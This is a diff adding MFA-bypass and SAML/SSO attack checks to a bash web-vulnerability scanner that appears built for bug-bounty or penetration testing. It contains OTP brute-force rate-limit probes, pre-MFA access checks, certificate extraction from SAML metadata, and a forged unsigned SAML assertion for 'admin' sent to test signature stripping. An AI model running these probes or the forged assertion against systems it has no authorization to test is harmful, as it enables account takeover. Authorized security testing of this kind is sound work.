@@ -296,6 +296,119 @@ if ! skip_has cms; then
     done
 fi
 
+# ── Check 8: MFA / 2FA Bypass ─────────────────────────────────────────────────
+if ! skip_has mfa; then
+    log_info "Check 8: MFA / 2FA Bypass"
+    mkdir -p "$FINDINGS_DIR/mfa"
+
+    # Detect MFA/OTP endpoints from URL list
+    MFA_ENDPOINTS=$(grep -iE "/(mfa|otp|2fa|verify|authenticate|token|totp|sms.code|auth.code)" \
+        "$ORDERED_SCAN" 2>/dev/null | head -20 || true)
+
+    if [ -n "$MFA_ENDPOINTS" ]; then
+        while IFS= read -r url; do
+            [ -z "$url" ] && continue
+            BASE=$(echo "$url" | cut -d'?' -f1)
+
+            # --- Test 1: Rate limit on OTP endpoint ---
+            log_step "Rate limit probe: $BASE"
+            STATUS_CODES=$(for i in $(seq 1 15); do
+                curl -sk -o /dev/null -w "%{http_code}\n" --max-time 5 \
+                    -X POST "$BASE" \
+                    -H "Content-Type: application/json" \
+                    -d '{"otp":"000000"}' 2>/dev/null || echo "ERR"
+            done | sort | uniq -c | sort -rn | head -5)
+            if echo "$STATUS_CODES" | grep -qv "429\|ERR"; then
+                log_vuln "[MFA] No rate limit detected on OTP endpoint: $BASE"
+                echo "[MFA-NO-RATE-LIMIT] $BASE | codes: $STATUS_CODES" >> "$FINDINGS_DIR/mfa/findings.txt"
+            fi
+
+            # --- Test 2: MFA workflow skip (pre-MFA session to protected page) ---
+            log_step "Workflow skip probe: $BASE"
+            # Try accessing /dashboard, /home, /profile with a fresh (unauthenticated) session
+            for PROTECTED in dashboard home profile account settings admin; do
+                HOST=$(echo "$url" | grep -oE "https?://[^/]+")
+                SKIP_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 \
+                    "$HOST/$PROTECTED" 2>/dev/null || echo "0")
+                if [ "$SKIP_CODE" = "200" ]; then
+                    log_vuln "[MFA] Protected endpoint accessible before MFA: $HOST/$PROTECTED"
+                    echo "[MFA-WORKFLOW-SKIP] $HOST/$PROTECTED accessible (HTTP 200)" >> "$FINDINGS_DIR/mfa/findings.txt"
+                fi
+            done
+
+            # --- Test 3: Response manipulation canary ---
+            # Check if server returns JSON with a success/failure flag (indicator only)
+            RESP=$(curl -sk --max-time 5 -X POST "$BASE" \
+                -H "Content-Type: application/json" \
+                -d '{"otp":"999999"}' 2>/dev/null || true)
+            if echo "$RESP" | grep -qi '"success"\s*:\s*false\|"verified"\s*:\s*false\|"status"\s*:\s*"fail"'; then
+                log_vuln "[MFA] Response manipulation candidate (server sends JSON success flag): $BASE"
+                echo "[MFA-RESPONSE-MANIP] $BASE | change false->true in response" >> "$FINDINGS_DIR/mfa/findings.txt"
+            fi
+
+        done <<< "$MFA_ENDPOINTS"
+    else
+        log_warn "No MFA/OTP endpoints detected in URL list"
+    fi
+fi
+
+# ── Check 9: SAML / SSO Attacks ───────────────────────────────────────────────
+if ! skip_has saml; then
+    log_info "Check 9: SAML / SSO Attack Surface"
+    mkdir -p "$FINDINGS_DIR/saml"
+
+    # Detect SAML/SSO endpoints
+    SAML_ENDPOINTS=$(grep -iE "/(saml|sso|login|auth|oauth|acs|idp|sp.init|adfs|okta|ping.fed)" \
+        "$ORDERED_SCAN" 2>/dev/null | head -20 || true)
+    # Also check common SAML paths on live hosts
+    LIVE_HOSTS=$(cat "$RECON_DIR/live/httpx_live.txt" 2>/dev/null | awk '{print $1}' | head -20 || true)
+
+    while IFS= read -r host; do
+        [ -z "$host" ] && continue
+        for SAML_PATH in "/saml/login" "/sso/saml" "/auth/saml" "/api/auth/saml" \
+                         "/login/saml" "/saml/acs" "/saml/metadata" "/adfs/ls" \
+                         "/.well-known/openid-configuration"; do
+            CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 \
+                "${host}${SAML_PATH}" 2>/dev/null || echo "0")
+            case "$CODE" in
+                200|301|302|403)
+                    log_vuln "[SAML] Endpoint found (HTTP $CODE): ${host}${SAML_PATH}"
+                    echo "[SAML-ENDPOINT] ${host}${SAML_PATH} | HTTP $CODE" >> "$FINDINGS_DIR/saml/endpoints.txt"
+                    ;;
+            esac
+        done
+    done <<< "$LIVE_HOSTS"
+
+    # Metadata exposure check (reveals IdP certs, entity IDs — aids XSW)
+    while IFS= read -r url; do
+        [ -z "$url" ] && continue
+        RESP=$(curl -sk --max-time 8 "$url" 2>/dev/null || true)
+        if echo "$RESP" | grep -qi "EntityDescriptor\|IDPSSODescriptor\|X509Certificate"; then
+            log_vuln "[SAML] Metadata exposed (aids XSW/cert extraction): $url"
+            echo "[SAML-METADATA-EXPOSED] $url" >> "$FINDINGS_DIR/saml/findings.txt"
+            # Extract cert if present
+            echo "$RESP" | grep -o '<X509Certificate>[^<]*' | head -3 >> "$FINDINGS_DIR/saml/certs.txt" 2>/dev/null || true
+        fi
+    done <<< "$(cat "$FINDINGS_DIR/saml/endpoints.txt" 2>/dev/null | awk '{print $2}' || true)"
+
+    # Signature stripping test via /saml/acs — send stripped assertion
+    ACS_URL=$(cat "$FINDINGS_DIR/saml/endpoints.txt" 2>/dev/null | grep "saml/acs\|saml/login" | head -1 | awk '{print $2}' || true)
+    if [ -n "$ACS_URL" ]; then
+        # Minimal stripped SAMLResponse (no Signature element, NameID = admin)
+        STRIPPED_SAML=$(echo '<?xml version="1.0"?><samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"><saml:Assertion><saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject></saml:Assertion></samlp:Response>' | base64 | tr -d '\n')
+        CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 \
+            -X POST "$ACS_URL" \
+            -d "SAMLResponse=${STRIPPED_SAML}" 2>/dev/null || echo "0")
+        if [ "$CODE" = "200" ] || [ "$CODE" = "302" ]; then
+            log_vuln "[SAML] Signature stripping accepted (HTTP $CODE): $ACS_URL — CRITICAL ATO"
+            echo "[SAML-SIG-STRIP] $ACS_URL | HTTP $CODE | stripped assertion accepted" >> "$FINDINGS_DIR/saml/findings.txt"
+        fi
+    fi
+
+    SAML_FINDINGS=$(wc -l < "$FINDINGS_DIR/saml/findings.txt" 2>/dev/null || echo 0)
+    [ "$SAML_FINDINGS" -gt 0 ] && log_ok "[SAML] $SAML_FINDINGS finding(s) — review $FINDINGS_DIR/saml/"
+fi
+
 # ── Summary ───────────────────────────────────────────────────────────────────
 log_info "Scan Complete. Consolidating..."
 {
@@ -306,5 +419,7 @@ log_info "Scan Complete. Consolidating..."
     echo "Verified Upload Only : $(count_vuln "$FINDINGS_DIR/upload/verified_upload_pocs.txt")"
     echo "XSS (dalfox)         : $(count_vuln "$FINDINGS_DIR/xss/dalfox_results.txt")"
     echo "SSTI Confirmed       : $(count_vuln "$FINDINGS_DIR/ssti/ssti_candidates.txt")"
+    echo "MFA Bypass Findings  : $(count_vuln "$FINDINGS_DIR/mfa/findings.txt")"
+    echo "SAML/SSO Findings    : $(count_vuln "$FINDINGS_DIR/saml/findings.txt")"
 } > "$FINDINGS_DIR/summary.txt"
 cat "$FINDINGS_DIR/summary.txt"
